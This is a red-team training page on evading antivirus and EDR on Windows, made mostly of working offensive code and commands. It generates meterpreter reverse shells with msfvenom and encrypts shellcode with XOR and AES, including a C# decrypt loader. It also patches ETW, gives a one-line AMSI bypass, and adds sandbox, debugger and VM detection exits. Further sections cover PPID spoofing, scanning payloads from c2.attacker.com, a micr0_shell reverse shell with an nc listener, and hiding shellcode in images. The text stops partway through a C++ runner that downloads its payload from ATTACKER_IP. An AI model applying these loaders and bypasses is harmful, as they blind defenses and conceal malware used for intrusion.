---
layout: training-page
title: "AV / EDR Evasion — Red Team Academy"
module: "Evasion"
tags:
  - av-evasion
  - edr
  - unhooking
  - sleep-encryption
  - obfuscation
page_key: "evasion-av-edr"
render_with_liquid: false
---

# AV / EDR Evasion

## AV vs EDR — Detection Layers

Understanding what each security product inspects helps target evasion techniques at the right layer. Traditional AV focuses on file signatures; EDR adds behavioral monitoring, kernel hooks, memory scanning, and telemetry collection.

![AV/EDR detection stack with 4 layers (signatures, AMSI, userland hooks, ETW) and corresponding bypass techniques for each](/images/evasion/av-edr-layers.svg)  
*// av/edr detection layers and targeted evasion approaches*

```
># AV (Traditional Antivirus):
# - File-based signature scanning (hash, byte patterns)
# - Heuristic scanning (static analysis)
# - AMSI integration for scripts
# Detection surface: file on disk, AMSI scan buffer

# EDR (Endpoint Detection & Response):
# - Kernel-level hooks via minifilter drivers
# - User-mode hooks in ntdll.dll (syscall interception)
# - ETW (Event Tracing for Windows) telemetry
# - Memory scanning (detect injected shellcode, unbacked PE)
# - Behavioral analysis (process hollowing, injection patterns)
# - Network telemetry (C2 callback patterns)
# - Cloud-based ML analysis

# Inspection points EDR covers:
# 1. Disk: file write, PE metadata, hash, entropy
# 2. Load: DLL load events, PE sections in memory
# 3. Execute: API call sequences, syscall patterns
# 4. Memory: RWX pages, unbacked executable memory, shellcode patterns
# 5. Network: C2 beacon patterns, TLS fingerprints (JA3)
# 6. Behavior: parent-child process relationships, privilege escalation
```

## Payload Obfuscation and Encoding

Breaking static signatures is the first step. Encoding, encryption, and structure modification prevent file-based and basic memory signature matches.

```
># XOR encoding shellcode (Python):
def xor_encode(shellcode, key):
    return bytes([b ^ key for b in shellcode])

shellcode = b"\xfc\x48\x83\xe4\xf0..."
key = 0x41
encoded = xor_encode(shellcode, key)

# Custom encoder stub — decode at runtime in C:
# for (int i = 0; i < len; i++) buf[i] ^= 0x41;

# msfvenom encoding (less effective against modern AV):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x64/xor_dynamic -i 5 -f raw -o shell.bin

# shikata_ga_nai (x86):
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o shell.exe

# Custom PE packer / crypter (most effective):
# - Encrypt payload with AES-256 or ChaCha20
# - Stub decrypts at runtime into a memory buffer
# - Execute from memory (no disk write for payload)

# Change PE metadata to avoid hash matching:
# - Recompile from source
# - Change strings, imports, section names
# - Add padding to change file hash
# - Modify timestamp, rich header
```

## EDR Hook Detection and Unhooking

EDR products hook user-mode API functions in ntdll.dll by overwriting function prologues with JMP instructions that redirect calls to the EDR's inspection code. Unhooking restores the original bytes from disk (a clean copy of ntdll.dll).

```
># How hooks work:
# Normal: ntdll!NtCreateProcess prologue = "4C 8B D1 B8 ..." (syscall stub)
# Hooked: ntdll!NtCreateProcess prologue = "E9 xx xx xx xx" (JMP to EDR code)

# Unhooking — load a fresh ntdll.dll from disk and restore sections:
# (Conceptual — actual implementation varies by tool)
# 1. Load ntdll.dll from disk: CreateFile → MapViewOfFile
# 2. Locate .text section in loaded copy
# 3. Compare against in-process ntdll .text section
# 4. Copy original bytes back for differing bytes (hooked functions)

# Tools that implement unhooking:
# - RefleXXion (C# .NET unhooker)
# - ShellyCoat
# - Havoc C2 built-in unhooking
# - Hell's Gate / Halo's Gate (syscall enumeration and direct invocation)

# Manual hook check with x64dbg/Windbg:
# bp ntdll!NtCreateProcess
# Check: does the first instruction start with "4C 8B D1" (normal) or "E9" (hooked)?

# Hell's Gate — read syscall numbers from hooked ntdll and call directly:
# Extracts SSN (syscall service number) from unhooked neighbor functions
# Calls via inline assembly (no ntdll call at all)
```

## Direct Syscalls

Direct syscalls bypass user-mode hooks entirely by executing the syscall instruction with the correct System Service Number (SSN), never calling through ntdll. This defeats EDR user-mode hooks but not kernel-level inspection.

```
># Syscall stub concept (x64 MASM):
; NtAllocateVirtualMemory stub
NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, 18h    ; SSN for NtAllocateVirtualMemory (varies by OS version!)
    syscall
    ret
NtAllocateVirtualMemory ENDP

# The SSN changes across Windows versions — use dynamic resolution:
# SysWhispers2: generates dynamic syscall stubs
# https://github.com/jthuraisamy/SysWhispers2
# Output: header + ASM stubs for selected NtAPI functions

# Usage after SysWhispers2 generation:
# NTSTATUS status = NtAllocateVirtualMemory(hProcess, &baseAddress, 0, &regionSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

# Tools that use direct syscalls:
# - Havoc C2 (built-in indirect syscalls)
# - BruteRatel C4
# - Many modern C# tools via SysWhispers
```

## Sleep Encryption / Heap Encryption

EDR memory scanners look for shellcode patterns while a payload is sleeping between C2 callbacks. Sleep encryption encrypts the payload in memory during sleep intervals, decrypting only when active — making memory scans during sleep find only ciphertext.

```
># Sleep encryption concept:
# 1. Implant wakes, decrypts itself in memory
# 2. Performs beacon/tasking
# 3. Before sleeping: encrypt own memory region with AES/ChaCha20
# 4. Sleep N seconds
# 5. Wake, decrypt, repeat

# Implementations:
# - Ekko (open-source C++ sleep mask using ROP chains)
# - Foliage (Cobalt Strike sleep mask)
# - Nightmask (BOF-based)
# - Most modern commercial C2s (Cobalt Strike, BruteRatel) support this natively

# Cobalt Strike sleep mask (Aggressor Script):
# set sleep_mask "true";  # in Malleable C2 profile
# Encrypts heap + stack before sleeping

# Memory region permissions — avoid RWX pages:
# RWX (readable + writable + executable) is suspicious
# Allocate RW, copy shellcode, then change to RX:
VirtualProtect(shellcode_ptr, shellcode_size, PAGE_EXECUTE_READ, &old_protect);
# RX pages with no corresponding backed file are still detectable
# but less suspicious than RWX
```

## Process Injection Overview

Injecting into a benign host process conceals activity under a trusted process name. Common injection methods and their detection signatures:

```
># Classic injection (highly detected):
# OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread

# Less-detected alternatives:

# Process Hollowing:
# SpawnProcess(suspended) → UnmapMainModule → WriteShellcode → ResumeThread
# Injects into new process at its entry point

# Module Stomping (DLL Hollowing):
# Load legitimate DLL → overwrite .text section with shellcode
# Memory shows legit backed module path — harder to detect

# APC Injection:
# OpenProcess → VirtualAllocEx → WriteProcessMemory → QueueUserAPC → ResumeThread
# Executes when target thread enters alertable state

# Thread Hijacking (SetThreadContext):
# SuspendThread → GetThreadContext → modify RIP → SetThreadContext → ResumeThread

# DLL Injection:
# OpenProcess → VirtualAllocEx (DLL path) → WriteProcessMemory → CreateRemoteThread(LoadLibraryA)

# Reflective DLL Injection:
# Write DLL into memory → call reflective loader function
# DLL loads itself from memory without disk write or LoadLibrary
# Tool: ReflectiveDLLInjection by Stephen Fewer
```

## Shellcode XOR Encryption

Encrypting shellcode defeats static signature scanning — the raw shellcode bytes are never present in the binary. At runtime, the encrypted bytes are decrypted and executed. XOR is simple but effective when the key is not trivially guessable.

```
# Workflow:
# 1. Generate shellcode: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.bin
# 2. Encrypt with Python:
python3 -c "
data = open('shell.bin','rb').read()
key = b'redteamexercises'
enc = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
print(','.join(hex(b) for b in enc))
"
# 3. Embed encrypted bytes in C++ runner, decrypt at runtime, execute

# Runtime decrypt + execute (concept):
# xor_decrypt(encrypted_shellcode, shellcode_size, key)
# VirtualAlloc → copy decrypted bytes → change to PAGE_EXECUTE_READ → CreateThread

# VirtualProtect trick (avoids PAGE_EXECUTE_READWRITE detection):
# Allocate with PAGE_READWRITE → write decrypted shellcode → VirtualProtect to PAGE_EXECUTE_READ → execute
# PAGE_EXECUTE_READWRITE is a strong EDR signal; split alloc/exec avoids it

# AES encryption (stronger, harder to brute-force key):
# Use CryptoAPI (BCryptEncrypt/BCryptDecrypt) or openssl AES-256-CBC
# Keep key hardcoded or derive from environmental value (username, computername)
```

## Windows API Abuse — Direct Syscalls and Unhooking

EDR products hook user-mode API functions in `ntdll.dll` to intercept calls like NtAllocateVirtualMemory. Bypassing these hooks lets shellcode execute without EDR visibility into API calls.

```
# EDR hooking mechanism:
# EDR replaces first bytes of ntdll functions with JMP to EDR's monitoring code
# ntdll is the bridge between user-mode and kernel — all Win32 API calls go through it

# Technique 1: Direct Syscalls
# Call syscall instruction directly with the syscall number, bypassing ntdll entirely
# Tools: SysWhispers2, SysWhispers3 — generate ASM stubs with correct syscall numbers
# SysWhispers2: https://github.com/jthuraisamy/SysWhispers2

# Technique 2: Indirect Syscalls
# Find the syscall instruction inside ntdll (even if the function start is hooked)
# Jump past the hook to the syscall instruction within ntdll

# Technique 3: Unhooking ntdll.dll
# Load a clean copy of ntdll.dll from disk (C:\Windows\System32\ntdll.dll)
# Overwrite the .text section of the in-memory ntdll with the clean copy
# All hooks are removed — EDR can't see API calls in that process

# PowerShell unhooking concept:
$ntdll = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(...)
# Or use managed unhooking tools: SharpUnhooker, etc.

# Dynamic API resolution to avoid suspicious IAT:
# LoadLibrary + GetProcAddress at runtime → function not in static import table
# PEB walking: enumerate loaded modules → find ntdll → walk export table manually
# API hashing: store hash of function name, resolve at runtime to avoid strings
```

## Sandbox Evasion Techniques

```
># AV sandboxes analyze executables in automated environments
# Detect sandbox and exit cleanly (appear benign):

# Time-based evasion (sleep before executing):
Sleep(300000);  // sleep 5 minutes — many sandboxes time out

# User interaction checks (no movement = automated sandbox):
POINT pt;
GetCursorPos(&pt);
Sleep(2000);
POINT pt2; GetCursorPos(&pt2);
if (pt.x == pt2.x && pt.y == pt2.y) exit(0);  // no mouse movement

# Recent keyboard activity:
LASTINPUTINFO lii; lii.cbSize = sizeof(LASTINPUTINFO);
GetLastInputInfo(&lii);
if ((GetTickCount() - lii.dwTime) > 5000) exit(0);  // no recent input

# Screen resolution check (sandboxes often use 800x600):
if (GetSystemMetrics(SM_CXSCREEN) <= 800) exit(0);

# CPU count check:
SYSTEM_INFO si; GetSystemInfo(&si);
if (si.dwNumberOfProcessors < 2) exit(0);  // VMs often have 1 CPU

# Memory check (sandboxes often have < 4GB RAM):
MEMORYSTATUSEX ms; GlobalMemoryStatusEx(&ms);
if (ms.ullTotalPhys < 4294967296ULL) exit(0);

# Check for sandbox DLLs loaded in process:
# SbieDll.dll (Sandboxie), VBoxSF.dll (VirtualBox), vmmouse.dll (VMware)
# Use CreateToolhelp32Snapshot + Module32First/Next to enumerate loaded modules

# Check for VM artifacts (registry, files, processes):
# VMware: VMware Tools processes, HKLM\SOFTWARE\VMware, Inc.
# VirtualBox: VBoxService.exe, HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions
# Hyper-V: vmbus, vmicheartbeat services
if (CheckForVMProcess("vmtoolsd.exe")) exit(0);

# Domain-joined check (sandboxes often not domain-joined):
LPWSTR domainName = nullptr; NETSETUP_JOIN_STATUS joinStatus;
NetGetJoinInformation(nullptr, &domainName, &joinStatus);
if (joinStatus != NetSetupDomainName) exit(0);
```

## Anti-Debugging Techniques

Malware and implants use layered anti-debugging checks to detect reverse engineering environments and alter behavior (usually exiting cleanly) before executing the real payload. Checks fall into several categories.

```
# Categories of anti-debugging checks:
# API-based:    IsDebuggerPresent(), CheckRemoteDebuggerPresent(), NtQueryInformationProcess()
# PEB/TEB:      PEB.BeingDebugged flag, PEB.NtGlobalFlag heap flags
# Trap-based:   INT 3, INT 2D, ICEBP (0xF1), Single Step via EFLAGS trap flag
# Timing:       RDTSC, QueryPerformanceCounter, GetTickCount — measure execution delay
# Hardware:     Debug registers DR0–DR7, thread hiding
# SEH/VEH:      Set up exception handlers that behave differently under a debugger

# PEB.NtGlobalFlag check (x64):
# pPeb = __readgsqword(0x60)
# If (pPeb->NtGlobalFlag & 0x70) != 0 → debugger present
# Flag 0x70 = FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS

# RDTSC timing check:
# t1 = __rdtsc(); Sleep(10); t2 = __rdtsc();
# If (t2 - t1) is abnormally small → debugger is distorting time

# Hardware breakpoint detection (DR0-DR7 registers):
# CONTEXT ctx = {0}; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
# GetThreadContext(GetCurrentThread(), &ctx);
# If ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3 → hardware BP set

# NtQueryInformationProcess DebugPort (ProcessInformationClass = 7):
# Returns non-zero DebugPort if process is being debugged at kernel level
# Harder to spoof than IsDebuggerPresent

# TLS Callback (executes before main/WinMain, before most debugger BPs):
# Declare void NTAPI TLSCallback(PVOID, DWORD, PVOID) with DLL_PROCESS_ATTACH
# Register via linker pragma — most debuggers miss this if BPs are set on main()

# Thread hiding via NtSetInformationThread (ThreadInformationClass = 0x11):
# Hides a thread from the debugger's thread list — breakpoints on it are ignored

# Reference: al-khaser project (hundreds of anti-debug/VM/sandbox tests):
# git clone https://github.com/LordNoteworthy/al-khaser
```

## Anti-VM Detection Techniques

Malware checks for virtual machine artifacts to detect sandbox and analysis environments. If a VM is detected, the payload typically exits cleanly to appear benign. These checks complement anti-sandbox techniques targeting behavioral analysis environments.

```
# CPUID hypervisor bit (ECX bit 31 when leaf=1):
# int cpuInfo[4]; __cpuid(cpuInfo, 1);
# if (cpuInfo[2] >> 31) & 1 → hypervisor present (VM)

# Known VM MAC address prefixes:
# VMware:      00:05:69, 00:0C:29, 00:50:56
# VirtualBox:  08:00:27
# QEMU/KVM:    52:54:00
# Enumerate with GetAdaptersInfo() and compare first 3 octets

# VM-specific registry keys:
# VMware: HKLM\SYSTEM\CurrentControlSet\Services\vmtools (vmtoolsd.exe)
#         HKLM\SOFTWARE\VMware, Inc.
# VirtualBox: HKLM\SYSTEM\CurrentControlSet\Services\VBoxService
#             HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions
# QEMU: qemu-ga service

# VM-specific device paths:
# VirtualBox: \\.\VBoxMiniRdrDN, C:\Windows\System32\drivers\vmmouse.sys
# VMware:     \\.\VMCI, vmhgfs.sys

# VM BIOS/SMBIOS strings (GetSystemFirmwareTable or WMI):
# "VMware", "VirtualBox", "QEMU", "Xen", "Hyper-V" in manufacturer field

# VM-specific processes:
# vmtoolsd.exe, vmwaretray.exe, vboxservice.exe, vboxtray.exe, xenservice.exe
# Use CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS) to enumerate

# Timing anomalies:
# VMs may have slower TSC or inconsistent I/O timing vs physical hardware
# Cross-reference RDTSC deltas with expected physical machine ranges
```

## EDR Detection Types

Modern AV and EDR products layer multiple detection methods. Understanding each type helps target evasion at the right layer — defeating signature scanning is not enough if behavioral analysis is active.

```
# 1. Signature-Based Detection
# - Hash matching, byte pattern matching against known malware databases
# - Scans files on write and load events
# - Evasion: polymorphism, encryption, custom packers, changing file metadata

# 2. Heuristic Detection (static rules)
# - Flags suspicious attributes without signature match:
#   - VirtualAllocEx + WriteProcessMemory imports
#   - High entropy sections (suggests packing/encryption)
#   - Small .text section + large .data (payload stored in data)
#   - Non-standard PE headers or modified timestamps
# - Evasion: padding payloads, splitting imports, multi-stage delivery

# 3. Behavioral Detection (runtime monitoring)
# - Tracks API call sequences and system call patterns
# - Flags: CreateProcess→InjectShellcode→CreateRemoteThread chains
# - Flags: Office/browser spawning PowerShell
# - Flags: autorun registry writes, scheduled task creation
# - Evasion: PPID spoofing, staging with delays, inject into benign processes

# 4. Machine Learning Detection
# - Models trained on API call sequences, PE metadata, entropy values
# - Inputs: syscall patterns, file structure, memory snapshots
# - Evasion: adversarial noise (junk API calls, fake strings), mimic benign software
#   structure and entropy, copy behavior of explorer.exe

# Detection Type vs Evasion Technique mapping:
# Signature    → encrypt/pack/encode payload
# Heuristic    → reduce entropy, normalize PE, delay load suspicious APIs
# Behavioral   → PPID spoof, sleep with variation, use LOLBins as intermediary
# ML           → insert benign-looking operations, mimic known-good telemetry
```

## Userland vs Kernel Hooking

EDR products intercept execution at two levels. Understanding which layer is active determines which bypass techniques are effective. Most commercial EDRs deploy both layers simultaneously.

```
# Userland Hooking (most common in commercial EDR):
# Target: API functions in ntdll.dll, kernel32.dll, user32.dll
# Method: Inline hooks — overwrite function prologue with JMP to EDR code
#         IAT hooks — replace function pointers in Import Address Table
# Examples hooked: CreateProcess, VirtualAllocEx, NtCreateThreadEx, NtWriteVirtualMemory
# Bypass: Direct syscalls (skip ntdll entirely), unhook by restoring clean bytes from disk
# Limitation: Cannot see calls that go directly to kernel (syscall instruction)

# Kernel Hooking (used by enterprise-grade EDR):
# Target: System calls, kernel events
# Methods:
#   SSDT Hooking — modify System Service Dispatch Table (patched by PatchGuard on modern Windows)
#   Callback Registration — PsSetCreateProcessNotifyRoutine, PsSetLoadImageNotifyRoutine
#   Object Callbacks — ObRegisterCallbacks (intercept process/thread handle operations)
#   ETW — Event Tracing for Windows as kernel-level telemetry source
# Cannot be bypassed with user-mode techniques alone
# Bypass: Requires kernel driver (BYOVD — Bring Your Own Vulnerable Driver), rootkits

# Detecting if functions are hooked:
# - Load clean ntdll.dll from disk, compare .text section byte-by-byte with in-memory version
# - Hooked function: first bytes = E9 xx xx xx (JMP) or FF 25 (JMP [rip+X])
# - Clean function: first bytes = 4C 8B D1 (mov r10, rcx) B8 XX 00 00 00 (syscall number)
# Tools: PE-sieve, HookFinder, HollowsHunter
```

## ETW Bypass

Event Tracing for Windows (ETW) is a kernel-level telemetry system used by EDR products to receive real-time events — process creation, DLL loading, memory allocation, and network activity. Patching ETW removes this visibility. Two approaches are used: patching EtwEventWrite to return immediately, or restoring it from a clean copy to remove EDR hooks on it.

```
# ETW patch approach 1: make EtwEventWrite return immediately
# Overwrite first byte of EtwEventWrite in ntdll.dll with 0xC3 (RET)
# Effect: all ETW events silently dropped, EDR loses telemetry

# Conceptual steps:
# hNtdll = GetModuleHandleA("ntdll.dll")
# pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite")
# VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &old)
# *pEtwEventWrite = 0xC3  # RET instruction
# VirtualProtect(pEtwEventWrite, 1, old, &old)

# ETW patch approach 2: restore clean bytes (remove EDR's ETW hook)
# Map clean ntdll.dll from disk (CreateFileMapping + MapViewOfFile)
# Locate EtwEventWrite in clean copy, copy 16 bytes back over hooked version
# Removes EDR jump stub, restores original function behavior

# Detection risk:
# - YARA rules scan for 0xC3 at start of EtwEventWrite
# - EDRs like Defender ATP and CrowdStrike validate integrity of ntdll functions
# - Restoring clean bytes is more stealthy but still detectable via runtime validation

# PowerShell AMSI bypass (same principle — patch AmsiScanBuffer to return clean):
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

## EDR Telemetry and Behavioral Graph Detection

EDRs do not rely on a single detection vector. They combine telemetry streams into behavioral graphs — each process and event is a node, relationships form edges. Even unknown malware can trigger alerts when the graph pattern matches known attack sequences.

```
# Telemetry vectors EDRs monitor:
# - Process creation/termination (CreateProcess, NtCreateProcessEx)
# - Module loading (LoadLibrary, LdrLoadDll) → DLL load events
# - File access/writes (file system minifilter driver)
# - Registry reads/writes (registry filter driver)
# - Network activity (NDIS filter, ETW)
# - Parent-child relationships (process tree lineage)
# - Memory allocations and protection changes
# - Syscall call stacks (origin address of syscall)

# Log sources EDRs consume:
# - Windows Event Log: 4688 (process creation), 5140 (share access)
# - Sysmon: Image loads (7), File creates (11), Registry mods (13), Network (3)
# - ETW providers: Microsoft-Windows-Kernel-Process, Microsoft-Windows-Threat-Intelligence
# - AMSI scan results

# Behavioral graph example — MSBuild shellcode execution:
# Outlook.exe → MSBuild.exe → (suspicious DNS) → (memory write + thread creation)
# Even without a matching signature, the graph pattern triggers alert

# Evasion implications:
# - Break expected graph patterns: spread actions across multiple processes
# - Operate below radar: long sleep intervals between C2 callbacks
# - Inject into processes already in normal behavioral profile (svchost, explorer)
# - Delay RW→RX memory transition to outlive heuristic windows (Sleep(10000) between steps)
# - Never assume successful execution = undetected (post-mortem analysis may reveal everything)
```

## Post-Exploitation Behavioral Evasion

After initial access, post-exploitation activity generates the highest volume of EDR telemetry. Behavioral evasion in this phase focuses on manipulating process relationships, memory flows, and execution patterns to appear like legitimate system activity.

```
# Post-exploitation anti-EDR tactic categories:
# API Evasion:    Direct/indirect syscall invocation to bypass userland hooks
# Memory Evasion: Allocate RW → write shellcode → delay → change to RX
# Event Disruption: Unhook ETW, patch AMSI before payload executes
# Process Tricks: PPID spoofing, sacrificial process injection, LOLBins
# Hook Detection: Scan ntdll.dll for JMP bytes, patch back to clean syscall stubs

# PPID Spoofing (parent process ID spoofing):
# EDRs flag suspicious parent-child chains: cmd.exe → powershell.exe → certutil.exe
# Solution: use STARTUPINFOEX + PROC_THREAD_ATTRIBUTE_PARENT_PROCESS to set a
# legitimate parent (explorer.exe, svchost.exe) when spawning a new process
# OPSEC: match command-line expectations of the spoofed parent, check token/ACL alignment

# Memory protection evasion (avoids immediate RW→RX flag):
# VirtualAllocEx(..., PAGE_READWRITE)   # Step 1: allocate as RW
# WriteProcessMemory(...)               # Step 2: write shellcode
# Sleep(10000)                          # Step 3: delay (outlive heuristic window)
# VirtualProtectEx(..., PAGE_EXECUTE_READ) # Step 4: change to RX (never RWX)

# Full-chain evasion flow used by advanced implants:
# 1. Map shellcode via NtCreateSection (no VirtualAlloc call in logs)
# 2. Inject via APC into spoofed-parent sacrificial process
# 3. Execute shellcode via syscall stub (bypass userland hooks)
# 4. Patch ETW + AMSI before C2 check-in
# 5. Sleep with encrypted heap between beacons

# Tools: ScareCrow (shellcode loader), DInvoke (dynamic P/Invoke), Donut (PE to shellcode)
```

## Static Analysis — ThreatCheck Workflow

When a payload is detected on disk, the exact bytes triggering detection are not obvious. **ThreatCheck** automates the process: it splits the binary into halves, asks Defender to scan each, and recursively narrows down until it isolates the exact byte range that triggers the detection signature. This tells you precisely what to encrypt or obfuscate.

```
# ThreatCheck — find the exact bytes Defender or AMSI detects in your binary:
# https://github.com/rasta-mouse/ThreatCheck (Rasta Mouse)
# Modified from matterpreter's DefenderCheck — adds AMSI engine + URL input

# Syntax:
ThreatCheck.exe --help
#   -e, --engine    Scanning engine: Defender (default) or AMSI
#   -f, --file      Analyze a file on disk
#   -u, --url       Analyze a file from a URL (downloads before scanning)
#   -t, --type      File type for AMSI: Bin (default) or Script

# Scan a binary against Windows Defender:
ThreatCheck.exe -f .\payload.exe
ThreatCheck.exe -f .\Grunt.bin -e Defender

# Scan a PowerShell script against AMSI:
ThreatCheck.exe -f .\launcher.ps1 -e AMSI -t Script

# Scan from URL (useful for testing staged payloads):
ThreatCheck.exe -u http://c2.attacker.com/payload.bin -e Defender

# ThreatCheck splits the file and scans halves recursively until it isolates
# the exact byte range that triggers detection. Output shows the ~256 bytes
# ending at the detection boundary — the signature anchor point.

# Example output (flagged bytes in hex + ASCII):
# [!] Identified end of bad bytes at offset 0x6D7A
# 00000000  65 00 22 00 3A 00 22 00  7B 00 32 00 7D 00 22 00   e.".:".{.2.}."..

# Common findings:
# - Meterpreter shellcode bytes (even a 50-byte window matches signatures)
# - Known strings: AmsiUtils, AmsiInitFailed, amsiInitFailed
# - Import table patterns: VirtualAllocEx + WriteProcessMemory combination
# - Specific GUID/UUID patterns in C2 staging payloads

# Workflow: use ThreatCheck to identify, then encrypt that specific section:
# 1. Run ThreatCheck → see flagged bytes and offset
# 2. XOR or AES encrypt those bytes (or the entire shellcode buffer)
# 3. Recompile with encrypted payload + runtime decryption stub
# 4. Re-run ThreatCheck → "No threat found!"
# 5. Test AMSI separately: ThreatCheck.exe -f script.ps1 -e AMSI -t Script

# Explore Defender's signature database to understand what strings are flagged:
# ExpandDefenderSig.ps1 (Matt Graeber) decompresses Defender signature .vdm files:
Import-Module C:\Tools\ExpandDefenderSig\ExpandDefenderSig.ps1
ls "C:\ProgramData\Microsoft\Windows Defender\Definition Updates\*\mpavbase.vdm" | Expand-DefenderAVSignatureDB -OutputFileName mpavbase.raw
# Search extracted database:
C:\Tools\Strings\strings64.exe .\mpavbase.raw | Select-String -Pattern "WNcry@2ol7"
```

## Static Analysis Evasion — AES Encryption Pattern

XOR encryption is often insufficient against modern Defender signatures — the encrypted shellcode's statistical patterns or the decryption loop itself may still match. AES-CBC encryption provides stronger evasion because it produces output indistinguishable from random bytes with no recoverable key from static analysis.

```
# Static analysis evasion workflow:
# 1. Generate shellcode: msfvenom -p windows/x64/meterpreter/reverse_http LHOST=... LPORT=... -f csharp
# 2. XOR or AES encrypt shellcode offline (CyberChef or Python)
# 3. Store only the encrypted bytes in the binary
# 4. Decrypt at runtime, write to allocated memory, execute

# AES-CBC decryption in C# (.NET Framework):
using System.Security.Cryptography;

// Encrypted shellcode (base64-encoded AES-CBC ciphertext):
string bufEnc = "BASE64_CIPHERTEXT_HERE";

// Key and IV (arbitrary — keep hardcoded or derive from environment):
byte[] key = new byte[16] { 0x1f, 0x76, 0x8b, 0xd5, 0x7c, 0xbf, 0x02, 0x1b, 0x25, 0x1d, 0xeb, 0x07, 0x91, 0xd8, 0xc1, 0x97 };
byte[] iv  = new byte[16] { 0xee, 0x7d, 0x63, 0x93, 0x6a, 0xc1, 0xf2, 0x86, 0xd8, 0xe4, 0xc5, 0xca, 0x82, 0xdf, 0xa5, 0xe2 };

Aes aes = Aes.Create();
ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
byte[] buf;
using (var msDecrypt = new System.IO.MemoryStream(Convert.FromBase64String(bufEnc)))
using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
using (var msPlain = new System.IO.MemoryStream()) {
    csDecrypt.CopyTo(msPlain);
    buf = msPlain.ToArray();
}
// buf now contains the original shellcode — allocate RW, copy, change to RX, execute

# CyberChef AES encryption recipe for shellcode:
# From_Hex('0x with comma') → AES_Encrypt(key, iv, CBC, Raw, Raw) → To_Base64

# Key insight: after AES encryption, ThreatCheck reports "No threat found"
# Even if Defender scans the process memory at runtime, decrypted shellcode
# in a non-Meterpreter payload (e.g., micr0_shell custom payload) will also
# not match signatures — changing the payload avoids behavioral detection too
```

## Dynamic Analysis Evasion — Three Approaches

Dynamic analysis (memory scanning triggered by behavioral events like new process creation) catches payloads that static analysis misses. Three approaches to evade it: modify the known payload's source to avoid signature matches, swap to a less-known payload, or write a fully custom tool that has no known signatures.

```
# The problem: static analysis is bypassed but runtime memory scan still detects
# Defender scans process memory on behavioral triggers (suspicious child process, etc.)
# Meterpreter shellcode remains unencrypted in memory once executing → detected

# --- Approach 1: Modify the Payload ---
# Change the Meterpreter source so the shellcode no longer matches known signatures
# Requires modifying Metasploit source (out of scope for most engagements)
# Alternative: use a custom shellcode stager that decrypts to non-Meterpreter bytes

# --- Approach 2: Change the Payload to Less-Known Shellcode ---
# Replace Meterpreter shellcode with a minimal custom reverse shell payload
# Example: micr0_shell — generates null-free PIC reverse shell shellcode
# https://github.com/senzee1984/micr0_shell

# Generate micr0_shell shellcode (Python):
python.exe micr0_shell.py -i 10.10.14.5 -p 8080 -l csharp

# Embed the AES-encrypted output in the shellcode loader
# Even if Defender scans memory, micr0_shell has no signature → no detection

# --- Approach 3: Write Fully Custom Tools ---
# Custom-written reverse shell has no known signatures in Defender's database
# Neither static nor behavioral analysis will flag it
# Does not require any shellcode or known-malicious API patterns

# Example: C# TcpClient reverse shell that spawns powershell.exe
# - Connect to attacker IP/Port via TcpClient
# - Spawn powershell.exe with -ep bypass -nologo
# - Redirect STDIN/STDOUT/STDERR to the TCP stream
# - No VirtualAlloc, no shellcode, no meterpreter → nothing to detect
# Detection risk: only behavioral (Office spawning PS, suspicious parent chain)
# This approach works even with real-time protection enabled if the tool is new

# Listener on attacker:
nc -lvnp 8080
# Run on target: RShell.exe 10.10.14.5 8080
```

## Image-Based Payload Concealment (ImgPayload)

Shellcode can be concealed inside valid image files using EOF markers, EXIF metadata, or LSB steganography. The image file passes AV file scanning and appears legitimate; a C++ runner downloads the image, locates the hidden shellcode at a known offset, and executes it. Technique based on the ImgPayload tool (Python, Pillow/piexif).

### Injection Techniques

```
# Install:
pip install pillow piexif

# --- Technique 1: EOF / BMP / GIF injection ---
# Appends shellcode after the image's end marker, separated by "/////" and ";".
# The image remains viewable; parsers stop at the image end marker.

python3 imgect.py --gif -f payload.bin -i cover.gif -o output.gif
python3 imgect.py --bmp -f payload.bin -o bmp_payload
# With XOR encoding:
python3 imgect.py --gif -f payload.bin --encode -k SUPERSECRET -o encoded.gif

# Output shows the byte offset to the shellcode start:
# [>] Use this offset in your C++ loader:
#     const size_t shellcodeStart = 36;

# --- Technique 2: EXIF metadata injection ---
# Stores shellcode in the JPEG UserComment EXIF field.
# Survives most image re-hosting (unless the host strips EXIF).

python3 imgect.py --exif -f payload.bin -i photo.jpg -o img_exif.jpg

# Extraction: parse UserComment field with piexif, base64-decode, XOR-decode if encoded.

# --- Technique 3: LSB steganography ---
# Hides shellcode bit-by-bit in the 3 least-significant bits of each RGB pixel.
# Invisible to the naked eye; requires PNG (lossless — JPEG destroys LSBs).

python3 imgect.py --lsb -f payload.bin -i cover.png -o steg_img.png

# Extraction: read 3 LSBs from each pixel channel, recombine bytes to restore shellcode.
# The visible image is nearly identical to the original.
```

### C++ Runner (WinInet Download + Execution)

```
// Runner downloads the image from a URL, extracts shellcode at a known offset,
// and executes it via VirtualAlloc + direct function cast.
// Compile: cl.exe /EHsc Runner.cpp wininet.lib

#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <vector>
#include <fstream>
#pragma comment(lib, "wininet.lib")

const char* imageURL = "http://ATTACKER_IP:PORT/payload.gif";
const char* imageFilename = "payload.gif";
